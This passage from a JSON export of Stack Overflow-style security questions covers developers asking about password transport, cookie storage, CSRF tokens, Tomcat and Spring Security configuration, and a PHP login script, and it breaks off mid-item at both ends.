cdn.somedomain.com?</li>\n</ol>\n\n<p>Thanks for helping an entrepenuer! :D</p>\n"},{"tags":["php","ajax","security","authentication","login"],"answer_count":13,"favorite_count":5,"up_vote_count":9,"down_vote_count":0,"view_count":3472,"score":9,"question_id":1145132,"title":"How safe is it to send a plain text password using AJAX?","body":"<p>Maybe the title is badly phrased but couldn't think of a better way of saying it.</p>\n\n<p>I am working on a login system at the moment (nothing formal, just experimenting) and was planning on using PHPLiveX (an AJAX library) for some features. Basically you create some PHP functions which are then called via JavaScript. You can add parameters (getElementById) to the javascript that are transfered to the PHP function.</p>\n\n<p>What i really wanted to know is whether it is safe to just call the function from javascript without encrypting the password first, then letting the PHP function encrypt it (SHA256 in this case). Can the data transfered via AJAX be intercepted? If so how likely is this?</p>\n\n<p>Thanks</p>\n"},{"tags":["security","postgresql","sqlalchemy"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":52,"score":0,"question_id":12850295,"title":"How to double quote escape in SQLAlchemy","body":"<p>I wish to safely pass a schema name that must be double-quote escaped to the database engine, in this case when constructing a GRANT statement I want to pass a variable containing test safely to the database.</p>\n\n<pre><code>GRANT SELECT ON ALL TABLES IN SCHEMA \"test\" TO readuser\n</code></pre>\n\n<p>I'm unsure how to do this from SQLAlchemy. </p>\n\n<p>If it helps I am using psycopg2 to connect to postgreSQL</p>\n"},{"tags":["java","security","tomcat","realm"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":2860,"score":0,"question_id":4400645,"title":"Configuring a Context specific Tomcat Security Realm","body":"<p>I am trying to get a context specific security Realm in Tomcat 6.0, but when I start Tomcat I get the following error:</p>\n\n<pre><code>09-Dec-2010 16:12:40 org.apache.catalina.startup.ContextConfig validateSecurityRoles\nINFO: WARNING: Security role name myrole used in an &lt;auth-constraint&gt; without being defined in a &lt;security-role&gt;\n</code></pre>\n\n<p>I have created the following context.xml file:</p>\n\n<pre><code>&lt;Context debug=\"0\" reloadable=\"true\"&gt;\n\n  &lt;Resource name=\"MyUserDatabase\"\n            type=\"org.apache.catalina.UserDatabase\"\n            description=\"User database that can be updated and saved\"\n            factory=\"org.apache.catalina.users.MemoryUserDatabaseFactory\"\n            pathname=\"conf/my-users.xml\" /&gt;\n\n  &lt;Realm className=\"org.apache.catalina.realm.UserDatabaseRealm\"\n         resourceName=\"MyUserDatabase\"/&gt;\n\n&lt;/Context&gt;\n</code></pre>\n\n<p>Created a file: my-users.xml which I have placed under WEB-INF/conf which contains the following:</p>\n\n<pre><code>&lt;tomcat-users&gt;\n  &lt;role rolename=\"myrole\"/&gt;\n  &lt;user username=\"test\" password=\"changeit\" roles=\"myrole\" /&gt;\n&lt;/tomcat-users&gt;\n</code></pre>\n\n<p>Added the following lines to my web.xml file:</p>\n\n<pre><code>&lt;web-app ...&gt;\n  ...\n  &lt;security-constraint&gt;\n    &lt;web-resource-collection&gt;\n      &lt;web-resource-name&gt;Entire Application&lt;/web-resource-name&gt;\n      &lt;url-pattern&gt;/*&lt;/url-pattern&gt;\n    &lt;/web-resource-collection&gt; \n    &lt;auth-constraint&gt;\n      &lt;role-name&gt;myrole&lt;/role-name&gt;\n    &lt;/auth-constraint&gt;\n  &lt;/security-constraint&gt;\n\n  &lt;login-config&gt;\n    &lt;auth-method&gt;BASIC&lt;/auth-method&gt;\n  &lt;/login-config&gt;\n  ...\n&lt;/web-app&gt;\n</code></pre>\n\n<p>But seem to get the error wherever I put conf/my-users.xml.  Do I have to specify an explicit PATH in the pathname or is it relative to somewhere?  Ideally I would like to have it packaged up as part of my WAR file.</p>\n\n<p>Any ideas?</p>\n"},{"tags":["security","cookies","subdomain","xss","hacking"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":30,"score":0,"question_id":12847920,"title":"Security risks of giving full access to a subdomain's content","body":"<p>There are many hosted/saas applications that give you full control over the content of your subdomain.</p>\n\n<p>So if the saas application is called example.com, when you signup you get full control of your site like:</p>\n\n<pre><code>my-website.example.com\n</code></pre>\n\n<p>You also login to edit the content at:</p>\n\n<pre><code>my-website.example.com/admin/\n</code></pre>\n\n<p>Seeing as there are 1000's of other customers, what security threads does this type of setup involve?</p>\n\n<p>What can be done to mitigate these security threats? </p>\n"},{"tags":["security","cryptography","x509certificate","public-key-encryption","publickey"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":128,"score":2,"question_id":6505204,"title":"If public key of two files are same, is it sufficient to conclude that they were signed by the same certificate?","body":"<p>I am implementing an auto-update mechanism for my software. The msi on the server is signed using signtool. My app downloads the msi and reads the public key of the downloaded msi. If the public key matches the one that is hard coded in the source code, it will execute the msi and update itself. </p>\n\n<p>Would this is be sufficient to ensure that no malicious msi gets executed by mistake? My understanding is that a file will have the same public key ONLY if signed by my certificate. </p>\n\n<p><strong>Edit:</strong>\nWith petey's help, I was able to detect if the msi was signed by my certificate or not. However, this didnt quite solve my problem. I can still edit the signed msi using a tool like Orca. Even the msi is no longer the same as the one that was signed, nothing happens to certificate. So when I check whether the msi is signed by me, I get yes. While I understand that this might be intended behaviour, but <strong>there must be some way to detect if the msi was tampered with??</strong></p>\n"},{"tags":["database","security","delete","record"],"answer_count":8,"favorite_count":1,"up_vote_count":12,"down_vote_count":0,"view_count":5369,"score":12,"question_id":378331,"title":"Physical or Logical Delete of Database Record","body":"<p>What is the advantage of doing a logical delete of a record (i.e. setting a flag stating that the record is deleted) as opposed to actually or physically deleting the record?</p>\n\n<p>Is this common practice?</p>\n\n<p>Is this secure?</p>\n"},{"tags":["wcf","security","http","username"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":48,"score":0,"question_id":12828295,"title":"WCF custom userName authentication using HTTP","body":"<p>I am trying to configure my WCF service to use a custom username validator over HTTP and my ASP.NET Development server.   Following are the parts of the serviceModel...</p>\n\n<pre><code>&lt;basicHttpBinding&gt;\n    &lt;binding name=\"Authentication\" &gt;\n      &lt;security mode=\"TransportCredentialOnly\" &gt;\n        &lt;message clientCredentialType=\"UserName\"/&gt;\n      &lt;/security&gt;\n    &lt;/binding&gt;\n&lt;/basicHttpBinding&gt;\n\n  &lt;service behaviorConfiguration=\"ApiBehavior\" name=\"CriticalWatch.AuthenticationAPI.AuthenticationAPI\"&gt;\n    &lt;endpoint address=\"/\" binding=\"basicHttpBinding\" bindingConfiguration=\"AuthenticationBinding\" name=\"Authentication\" contract=\"CriticalWatch.AuthenticationAPI.IAuthenticationAPI\" /&gt;\n  &lt;/service&gt;\n</code></pre>\n\n<p>I then have a behavior for the validator...</p>\n\n<pre><code>  &lt;serviceBehaviors&gt;\n    &lt;behavior name=\"ApiBehavior\"&gt;\n      &lt;serviceMetadata httpGetEnabled=\"true\" /&gt;\n      &lt;serviceDebug includeExceptionDetailInFaults=\"true\" /&gt;\n      &lt;serviceCredentials&gt;\n        &lt;userNameAuthentication userNamePasswordValidationMode=\"Custom\" customUserNamePasswordValidatorType=\"Service.CustomUserNameValidator, MyService\" /&gt;\n      &lt;/serviceCredentials&gt;\n\n    &lt;/behavior&gt;\n  &lt;/serviceBehaviors&gt;\n</code></pre>\n\n<p>My CustomUserNameValidator inherits from the  UserNamePasswordValidator.  The validator class gets instantiated,  but the Validate method is never called.  Plus, the client can call the method without passing any username and password.</p>\n\n<p>What am I missing?</p>\n\n<p>At this time, I want a solution that does not require HTTPS.   I want to rely on the username and password passed with the message.</p>\n"},{"tags":["database","sql-server-2008","security","encryption"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":64,"score":3,"question_id":12840665,"title":"Securing a SQL Server database on a server administered /controlled by third party admins","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/4552376/is-it-possible-to-password-protect-an-sql-server-database-even-from-administrato\">Is it possible to password protect an SQL server database even from administrators of the server?</a>  </p>\n</blockquote>\n\n\n\n<p>I am hosting my database on SQL Server 2008 on a windows 7 machine. The Windows 7 machine and the SQL Server 2008 are controlled and administered by third party admins. </p>\n\n<p>I have sensitive information in my database. </p>\n\n<p>How do I secure my database, so that the third party admins do not look at the sensitive data?</p>\n\n<p>Is there any way to restrict the third party admins from copying the stored procedures, table designs etc.</p>\n"},{"tags":["php","arrays","security","cookies"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":106,"score":1,"question_id":12006725,"title":"Is it safe to store an array in a cookie?","body":"<p>I have a script which takes arrays to shuffle them and then stores them into a cookie, so that user will have shuffled array only once.</p>\n\n<p>Here's the script:</p>\n\n<pre><code>$shufflecookie = $_COOKIE['shuffle'];\n                \nif (isset($_COOKIE['shuffle'])) {\n  $items = unserialize(gzuncompress(base64_decode($shufflecookie)));\n}\nelse {\n  shuffle($items);\n  $items_serialized = base64_encode(gzcompress(serialize($items)));\n  setcookie(\"shuffle\", $items_serialized, 0, \"/\");\n}\n</code></pre>\n\n<p>Is it safe to do that? or maybe there's better way of storing this data? Thanks</p>\n\n<p>UPD. Thanks for helping. What I did is just replaced cookie with session. So new code is:</p>\n\n<pre><code>$shufflecookie = $_SESSION[\"shuffle\"];\n                \nif (isset($_SESSION[\"shuffle\"])) {\n  $items = unserialize(gzuncompress(base64_decode($shufflecookie)));\n}\nelse {\n  shuffle($items);\n  $items_serialized = base64_encode(gzcompress(serialize($items)));\n  $_SESSION[\"shuffle\"] = $items_serialized;\n}\n</code></pre>\n"},{"tags":["php","security","obfuscation","zend-guard"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":83,"score":1,"question_id":12017164,"title":"Protecting code using Zend Guard","body":"<p>I'd like to protect a PHP app that a client wants to have hosted on their own servers - I know that Zend Guard &amp; Ion Cube do some form of protection but i've also found sites that will reverse engineer this code.</p>\n\n<p>My question is - is there a way to obfuscate the code first, then load it through the Zend Guard to give it a 'second layer' of protection.</p>\n\n<p>Apart from the slowdown of performance of this site what other pros &amp; cons could I expect if this is even at all possible?</p>\n"},{"tags":["security","java-ee","tomcat","tomcat6","access-control"],"answer_count":4,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":1654,"score":2,"question_id":10498237,"title":"How can I restrict access to certain URLs by source IP in Tomcat?","body":"<p>I want to restrict access to certain URLs in my Tomcat webapp. \nOnly 3 known IP addresses should be allowed access to URLs that fit a certain pattern.</p>\n\n<p>e.g. <code>http://example.com:1234/abc/personId</code></p>\n\n<p>How can I achieve this?</p>\n"},{"tags":["php","security","hash"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":70,"score":0,"question_id":12844322,"title":"Trying To Understand PHP password_hash","body":"<p>I'm trying to learn more about PHP security best practices, and I came across password_hash and the <a href=\"https://github.com/ircmaxell/password_compat\" rel=\"nofollow\">password_compat</a> project by Anthony Ferrara.  I think I understand how to implement it, but in testing, I came across a curious behavior that contradicts my novice understanding of password hashing.</p>\n\n<p>If I save the result of the password_hash function into a MySQL database user record and then retrieve that hash for verification using password_verify, it works as expected.  However, if I do the exact same thing, but rather than pull from the database, I just hard-code the password hash via a copy/paste from the database, the password_verify function fails.</p>\n\n<p>The code is below:</p>\n\n<pre><code>// Get the Username and password hash from the MySQL database.  GetPassTestuser routine returns an array where\n//   position[0][0] is the username and position[0][1] is the password hash.\n$arrUser = GetPassTestuser(\"mike24\");\necho(\"User Name: \".$arrUser[0][0].\"&lt;br/&gt;\");\necho(\"Password hash: \".$arrUser[0][1].\"&lt;br/&gt;\");\n\n// Run password_verify with the password hash collected from the database.  Compare it with the string \"mytest\"\n//  (This returns true in my tests).\nif (password_verify(\"mytest\",$arrUser[0][1])){\n    echo(\"Password verified\");\n} else {\n    echo(\"Password invalid\");\n}\necho(\"&lt;hr&gt;Now On to our second test...&lt;br/&gt;\");\n// Now run password_verify with a string representation directly copied/pasted from the database.  This is \n//   being compared with \"mytest\", which in my mind should return a true value.  But it doesn't and this test\n//   fails.  Not sure why.\nif (password_verify(\"mytest\",\"$2y$10$S33h20qxHndErOoxJL.sceQtBQXtSWrHieBtFv59jwVwJuGeWwKgm\")){  // String shown here is the same as value contained in $arrUser[0][1]\n    echo(\"2nd Test Password verified\");\n} else {\n    echo(\"2nd test Password invalid\");\n}\n</code></pre>\n\n<p>While this isn't something I'd do in real code, I'm just trying to understand what the difference is.  Why does it work OK when I use the string variable that supposedly contains the exact same hash, but doesn't work when it's hard coded?</p>\n\n<p>Thanks!</p>\n"},{"tags":["security","wsdl","spring-ws"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":30,"score":0,"question_id":12843436,"title":"Spring-WS 2, how to include ws-policies in auto generated wsdl?","body":"<p>I have to add security to web services implemented using spring-WS. I added the security using apache API and everything is working as expected when test it with SoapUI. I noticed that my security policies are not included in the auto generated wsdl. I searched and haven't found any solution.</p>\n\n<p>Anyone knows how to include the policies into the wsdl?</p>\n"},{"tags":["php","security"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":1,"view_count":65,"score":1,"question_id":12843314,"title":"What is best way to save user's data to carry through the website pages in PHP?","body":"<p>What is the best way to carry users data through the pages(php)? Currently, I use sessions to hold and use data like username, lastlogin, password, purchased items and ... between the website pages.</p>\n\n<p>Would saving these data in sessions decrease security of website? Is there another way(s) to carry these data?</p>\n"},{"tags":["security","chat"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":604,"score":0,"question_id":4574411,"title":"Chat program without a central server","body":"<p>Happy new year to all of you!</p>\n\n<p>I'm developing a chat application (in VB.Net).</p>\n\n<p>It will be a secure chat program.</p>\n\n<p>All traffic will be encrypted (I also need to find the best approach for this, but that's not the question for now).</p>\n\n<p>Currently the program works. I have a server application and a client application.</p>\n\n<p>However I want to setup the application so that it doesn't need a central server for it to work.</p>\n\n<p>What would be the best approach for this case.</p>\n\n<p>I think I need to develop the clients in a way so that they do also act as a server.</p>\n\n<p>How would the clients know what server it needs to connect with / what happens if a server is down? How would the clients / servers now what other nodes there are in the network without having a central server?</p>\n\n<p>At best I don't want the clients to know what the IP addresses are of the different nodes, however I don't think this would be possible without having a central server.</p>\n\n<p>As stated the application will be written in VB.Net, but I think the language doesn't really matter at this point.</p>\n\n<p>Just want to know the different approaches I can follow.</p>\n"},{"tags":["mysql","security","pdo","user-input"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":27,"score":2,"question_id":12842822,"title":"PHP PDO clean user input","body":"<p>I've been looking into the most efficient method of cleaning user input. My application is a simple post request that is used to authenticate a user. Looking online I can find more then a dozen different \"best\" methods of doing this. A lot of these methods use deprecated php functions or seem overly complicated. In order to connect to my sql database I use the PDO class. </p>\n\n<p>While searching for my own functions I stumbled accross this:</p>\n\n<blockquote>\n  <p>Prepared statements with bound parameters are not only more portable, more convenient, immune to SQL injection, but are often much faster to execute than interpolated queries, as both the server and client side can cache a compiled form of the query.</p>\n</blockquote>\n\n<p>I already use the prepare method to create my statement. Does this mean I'm safe against SQL injection attacks? What else should I be worried about? </p>\n"},{"tags":["iphone","security","ios","video","drm"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":692,"score":2,"question_id":5548981,"title":"iOS: encrypt / decrypt video file","body":"<p>We are in the process of talking about how to set up an online video rental store. Besides streaming we would love it if the user would be able to download a movie first, which is then stored for a certain amount of time on the device itself, in this scenario an iOS-device.</p>\n\n<p>But how can we achieve this and keep it save? Obviously we don't want the user to be able to simply copy the file from the filesystem which is a pretty easy task once the device is jailbroken.</p>\n\n<p>So there is the need to store the file encrypted or with some sort of DRM. But even then: How to make sure that the user can't decrypt it himself? And once playback is started how can we achieve that we don't decrypt the whole file (which would be too big to store it in the memory) so that the user doesn't get access it.</p>\n\n<p>Any ideas / solutions?</p>\n"},{"tags":["java","spring","security","getmethod"],"answer_count":1,"favorite_count":2,"up_vote_count":1,"down_vote_count":0,"view_count":106,"score":1,"question_id":12838607,"title":"Spring Security access to a request, without pre-authentication, from remote access","body":"<p>I wrote here because I cannot find a clear answer to my problem:</p>\n\n<p>My project is using Spring MVC and Spring Security. I well installed both for a web application (of course using Java). I can access with post and get method, but only after the user has been connected via the usual form of Spring Security.</p>\n\n<p>From now, the user do a request on an address like this: </p>\n\n<p><code>../../get.request?request=getListCommand</code></p>\n\n<p>where get.request is a mapping from Spring MVC. This access is enable only after the user has been authenticated!</p>\n\n<p><strong>What I need to do:</strong> <em><strong>Add</em></strong> the possibility to access directly to this request, without has been authenticated previously, using an address like this one for example:</p>\n\n<p><code>http://123.123.123.123:123/get.request?request=getListCommand&amp;j_password=myPassword&amp;j_username=myName</code> </p>\n\n<p>or</p>\n\n<p><code>same thing with the post protocol and the params given (request=getListCommand, j_password=myPassword, j_username=myName)</code></p>\n\n<p>Of course the authentication will have to be done previously the request is performed and the result sent back.</p>\n\n<p>I searched on many website or directly on the Spring security website. They talk about filterchaining, own user name authentication, RMI; but I don't really found a full example doing what I presented above.</p>\n\n<p>Thanks for anyone than can help me that way.</p>\n\n<p>ps: I use all default or the most simple configuration for Spring security (no fengshui' style :-))</p>\n\n<p>Here is my securit context xml file</p>\n\n<pre><code>&lt;http realm=\"NexCap Up\"\n        auto-config=\"true\"\n        access-denied-page=\"/www/jsp/authentication/accessDenied.jsp\"\n        create-session=\"always\"\n        disable-url-rewriting=\"true\"&gt;          \n            &lt;port-mappings&gt;\n                &lt;port-mapping http=\"8084\" https=\"8443\"/&gt;\n            &lt;/port-mappings&gt;        \n\n            &lt;intercept-url pattern=\"/www/jsp/authentication/connexion.jsp\"                    \n                access='IS_AUTHENTICATED_ANONYMOUSLY' requires-channel=\"https\"/&gt;\n\n            &lt;intercept-url pattern=\"/www/jsp/authentication/connexionFailed.jsp\" \n                access='IS_AUTHENTICATED_ANONYMOUSLY'  /&gt;\n\n            &lt;intercept-url pattern=\"/www/jsp/authentication/applicationExit.jsp\" \n                access='IS_AUTHENTICATED_ANONYMOUSLY'  /&gt; \n\n\n          &lt;intercept-url \n                pattern=\"/get.Request\" \n                method=\"GET\"\n                access=\"ROLE_REMOTE\" /&gt;\n\n             &lt;intercept-url \n                pattern=\"/post.Request\"  \n                method=\"POST\"\n                access=\"ROLE_REMOTE\" /&gt;\n\n            &lt;intercept-url pattern=\"/**\" \n                access=\"ROLE_REMOTE,ROLE_SCRIPT\"  /&gt;\n       &lt;form-login \n            authentication-failure-url=\"/www/jsp/authentication/connexionFailed.jsp\"\n            login-page=\"/www/jsp/authentication/connexion.jsp\"\n            default-target-url=\"/www/jsp/index.jsp\"\n            always-use-default-target=\"true\"/&gt;\n\n        &lt;logout\n            logout-success-url=\"/www/jsp/authentication/applicationExit.jsp\"\n            invalidate-session=\"true\"/&gt;\n\n        &lt;session-management\n            invalid-session-url=\"/www/jsp/authentication/invalidSession.jsp\"\n            session-authentication-error-url = \"/www/jsp/authentication/authentificationError.jsp\"\n            session-fixation-protection=\"none\"&gt;\n\n            &lt;!-- Sessions concurrentes --&gt;\n            &lt;concurrency-control \n                error-if-maximum-exceeded=\"false\"\n                expired-url=\"/www/jsp/authentication/sessionExpired.jsp\"\n                max-sessions=\"1\" /&gt;\n\n        &lt;/session-management&gt;\n\n    &lt;/http&gt;\n</code></pre>\n\n<p>And the part of the web.xml file about the spring security</p>\n\n<pre><code>&lt;security-constraint&gt;\n    &lt;web-resource-collection&gt;\n        &lt;web-resource-name&gt;Security&lt;/web-resource-name&gt;\n        &lt;url-pattern&gt;/*&lt;/url-pattern&gt;\n    &lt;/web-resource-collection&gt;\n    &lt;user-data-constraint&gt;\n        &lt;transport-guarantee&gt;CONFIDENTIAL&lt;/transport-guarantee&gt;\n    &lt;/user-data-constraint&gt;\n&lt;/security-constraint&gt;\n\n\n&lt;filter&gt;\n  &lt;display-name&gt;springSecurityFilterChain&lt;/display-name&gt;\n  &lt;filter-name&gt;springSecurityFilterChain&lt;/filter-name&gt;\n  &lt;filter-class&gt;\n      org.springframework.web.filter.DelegatingFilterProxy\n  &lt;/filter-class&gt;\n</code></pre>\n\n<p></p>\n\n<pre><code>&lt;filter-mapping&gt;\n   &lt;filter-name&gt;springSecurityFilterChain&lt;/filter-name&gt;\n   &lt;url-pattern&gt;/*&lt;/url-pattern&gt;\n</code></pre>\n\n<p></p>\n\n<pre><code>&lt;context-param&gt;\n   &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt;\n   &lt;param-value&gt;\n       /WEB-INF/spring/secu-config.xml\n   &lt;/param-value&gt;\n</code></pre>\n\n<p></p>\n"},{"tags":["windows","security","process","windows-sdk"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":132,"score":1,"question_id":2384022,"title":"WINSDK: Determining whether an arbitrary pid identifies a running process on Windows","body":"<p>Attempting to implement a poor man's test of whether a process is still running or not (essentially an equivalent of the trivial <code>kill(pid, 0)</code>.)</p>\n\n<p>Hoped to be able to simply call <code>OpenProcess</code> with some minimal desired access then test for either <code>GetLastError() == ERROR_INVALID_PARAMETER</code> or <code>GetExitCodeProcess(...) != STILL_ACTIVE</code>.</p>\n\n<p>Nice try...  Running on Windows XP, as administrator:</p>\n\n<pre><code>HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);\nif (!hProc) {\n  DWORD dwLastError = GetLastError();\n}\n</code></pre>\n\n<p>...fails miserably with <code>dwLastError == ERROR_ACCESS_DENIED</code> when <code>pid</code> is owned by a different (not SYSTEM) user.  Moreover, if <code>pid</code> <em>was</em> originally owned by a different user but has since terminated, <code>OpenProcess</code> also fails with <code>ERROR_ACCESS_DENIED</code> (not <code>ERROR_INVALID_PARAMETER</code>.)</p>\n\n<p>Do I have to use <code>Process32First</code>/<code>Process32Next</code> or <code>EnumProcesses</code>?</p>\n\n<p>I absolutely <strong>do not want to use <code>SeDebugPrivilege</code></strong>.</p>\n\n<p>Thanks,\nV</p>\n"},{"tags":["linux","security","passwords","ssh-keys"],"answer_count":10,"favorite_count":5,"up_vote_count":15,"down_vote_count":0,"view_count":920,"score":15,"question_id":208007,"title":"how do you manage servers' root passwords","body":"<p>In our administration team everyone has root passwords for all client servers.\nBut what should we do if one of the team members is not longer working with us?\nHe still has our passwords and we have to change them all, every time someone leave us. </p>\n\n<p>Now we are using ssh keys instead of passwords, but this is not helpful if we have to use something other than ssh.</p>\n"},{"tags":["iphone","security","post","data","webserver"],"answer_count":1,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":42,"score":2,"question_id":12646502,"title":"Send post data securely from iPhone","body":"<p>I have the following issue:\nI've understood how to create a secure login between an iPhone app and a WebServer (SSL,Https).\nMy question is after creating the session token, how do I make sure that if a hacker intercepts it, in the subsequent POST requests I receive data from the same user?   </p>\n\n<p>I ask this because I would have to send the session token each time a request is made right? (to be able to identify the user).  </p>\n\n<p>I want to prevent multiple things:  </p>\n\n<ul>\n<li>Session hijacking where someone would sniff the users token and send data instead of him (like a highscore or something)</li>\n<li>Data injection using data that would not be normally sent from my app like a 1.000.000.000 highscore (possible score but not easily attainable).</li>\n</ul>\n\n<p>I have been looking at:</p>\n\n<ul>\n<li>UDID</li>\n<li>User Agent (if it's not from the app name of my app it's not good, the hacker would actually have to guess I do this check or download my php files somehow right?)</li>\n<li>The app is from the AppStore. If the request comes from an app that hasn't been approved by Apple it's not ok. I'm not actually sure if you can test this or not. If this works a hacker would have to actually submit an AppStore and download it to insert faulty data into my database which I hope nobody has time for.</li>\n<li>The MAC adress. Not sure if allowed by Apple. The IP doesn't work because a valid user might change IP's.</li>\n</ul>\n\n<p>Cookies from what I've seen can be easily traced and see what data is inside them.  </p>\n\n<p>Maybe I'm not asking the right question here so it could actually be how can I make sure the data I receive is from the correct user and the correct application?  </p>\n\n<p>Thank you!</p>\n"},{"tags":["javascript","security","validation"],"answer_count":7,"favorite_count":8,"up_vote_count":33,"down_vote_count":0,"view_count":17021,"score":33,"question_id":162159,"title":"JavaScript: client-side vs. server-side validation","body":"<p>Which is better to do client side or server side validation?</p>\n\n<p>In our situation we are using </p>\n\n<ul>\n<li>jQuery and MVC.  </li>\n<li>JSON data to pass between our View and Controller.  </li>\n</ul>\n\n<p>A lot of the validation I do is validating data as users enter it.\nFor example I use the the <code>keypress</code> event to prevent letters in a text box, set a max number of characters and that a number is with in a range. </p>\n\n<p>I guess the better question would be, Are there any benefits to doing server side validation over client side?</p>\n\n<hr>\n\n<p>Awesome answers everyone. The website that we have is password protected and for a small user base(&lt;50). If they are not running JavaScript we will send ninjas. But if we were designing a site for everyone one I'd agree to do validation on both sides.</p>\n"},{"tags":["java","security"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":104,"score":1,"question_id":12833362,"title":"how to choose the design pattern in java","body":"<p>i have a project to be done which on the domain of healthcare, so what design pattern would be used or should be used because the system should be strong enough so that no hacker find a way to hack or steal the information.</p>\n\n<pre><code>the following technology is used\n1.struts 1.2.9\n2.mysql for backend\n3.spring security.\n</code></pre>\n\n<p>so please suggest me the best design for this and the sample if possible since i have never worked with design pattern.</p>\n\n<p>So please help me to achieve this</p>\n\n<p>Regards.</p>\n"},{"tags":["security","frameworks","csrf"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":42,"score":0,"question_id":12823390,"title":"What stops someone from reading CSRF tokens in form inputs with JS","body":"<p>Most frameworks I've looked at will insert into forms a hidden input element with the value being a CSRF token.  This is designed to prevent user Bob from logging in on my site and then going to <a href=\"http://badsite.com\" rel=\"nofollow\">http://badsite.com</a> which embeds img tags or JS that tell my site to execute requests using Bob's still logged in session.</p>\n\n<p>What I'm not getting is what stops JS on badsite.com from AJAX requesting a URL with a form on my site, regex-ing the CSRF token from the hidden input element, and then AJAX posting to my site with that valid CSRF token?</p>\n\n<p>It seems to me that you'd want to use JS to insert the CSRF token into the form at runtime, pulling the value from a cookie (which is inaccessible to badsite.com).  However, I've not heard this approach mentioned and so many frameworks do the simple hidden input with the CSRF token, I'm wondering if my solution is over-engineered and I'm missing some part of what makes the hidden input method secure.</p>\n\n<p>Can anyone provide some clarity? Thanks!</p>\n"},{"tags":["php","security","login-script"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":96,"score":0,"question_id":12749353,"title":"Problems with PHP, MySQL based log-in system","body":"<p><strong>IMPORTANT</strong></p>\n\n<p>After following the advice in the answers below, the client was able to log-in without any problems but did not attempt to actually navigate the secured pages. When he attempted to do so later, he was returned to log-in as before with the \"Please log in\" error. After much head scratching, something incredibly simple came to mind - the client was accessing the site with <a href=\"http://www.example.com/admin\" rel=\"nofollow\">http://www.example.com/admin</a> and everything in the login script was redirecting to <a href=\"http://example.com\" rel=\"nofollow\">http://example.com</a>, so the session cookie that it was looking for was set for another domain. This also explains why he had problems logging in the first time but not subsequent times - the script redirected him to the log-in form without the www.</p>\n\n<p>A quick fix was to write a .htaccess file to remove the www, problem solved. Of course this could also be handled within the login script, which I will improve for future use.</p>\n\n<p><strong>ORIGINAL POST</strong></p>\n\n<p>I develop PHP and MySQL based sites with a home brew CMS and log-in system. My CMS is unique to every client and it has been quite the crowd pleaser - unfortunately the same is not true of my log-in system. The following is a long post but I need to cover the details to try and find a solution. Bear with me..</p>\n\n<p>The system is fairly straight forward, if not a bit hefty. Each user has a salted hash stored in a MySQL table, alongside the SALT. When the user logs in, their SALT is retrieved and the submitted password becomes a salted hash.</p>\n\n<p>If the submitted salted hash matches the one stored in the table, the user is authenticated. Details such as their name, last IP address, and account level (3 levels on most sites) are stored in an array assigned to a session variable. They are then redirected to the landing page of the restricted site to which they logged in (Members Only or Admin/CMS).</p>\n\n<p>Secured pages include a smaller auth.php file that checks to see if the session variable containing their details is present. If not, they are redirected to that site's log-in form with an error message that reads \"Please log-in.\" If it is present, they are allowed to continue and the details stored in the array are assigned to variables.</p>\n\n<p>The problem that many users has reported is that they often need to log-in several times to keep from being bounced back to the log-in form with the \"Please log-in\" error message, or they navigate to another page in the secure site and randomly get bounced back to login with the same error. So, the session variable seems to either not be getting set or it is being cleared for some reason during normal use of the site. </p>\n\n<p>The first problem has NEVER happened to me - over a multitude of devices and networks - and I have witnessed it at a client's office using their laptop. I had them connect to my mobile hotspot and there was no change. However, they were able to log in without any problems using my laptop and my hotspot connection. Unfortunately, I was not able to connect to their network using my laptop, so that variable could not be ruled out.</p>\n\n<p>*<strong><em>NOTE - *</em></strong> I forgot to mention initially that the system works normally for problem clients after they have logged in two or three times with the correct credentials. Subsequent log-in attempts while their browser remains open tend to execute without problems thereafter. Also, the log-in page destroys the session.</p>\n\n<p>Here is the code for each stage, starting with the log-in script:</p>\n\n<p><strong>login.php</strong></p>\n\n<pre><code>&lt;?php\nputenv(\"TZ=US/Eastern\");\n\nif (array_key_exists('site', $_POST)) {\n    $authenticate = new loginUser($_POST['username'], $_POST['password'], $_POST['site'], $_SERVER['REMOTE_ADDR']);\n}\n//Authenticate and log-in\nclass loginUser {\n    private $memDB, $username, $password, $site, $ip_address;\n\n     //Clean input variables\n    private function clean($str) {\n        $str = @trim($str);\n        if(get_magic_quotes_gpc()) {\n            $str = stripslashes($str);\n        }\n        return $str;\n    }\n    //Construct variables\n    function __construct($username, $password, $site, $ip_address) {\n    session_start();\n        $this-&gt;memDB = new PDO('mysql:host=localhost;dbname=exampleDB', 'exampleUser', 'examplePassword');\n        $this-&gt;username = $this-&gt;clean($username);\n        $this-&gt;password = $this-&gt;clean($password);\n        $this-&gt;site = $site;\n        $this-&gt;ip_address = $ip_address;\n    $this-&gt;authUser();\n    }\n    //Validate username\n    private function validateUsername($username) {\n\n        $checkUsername = 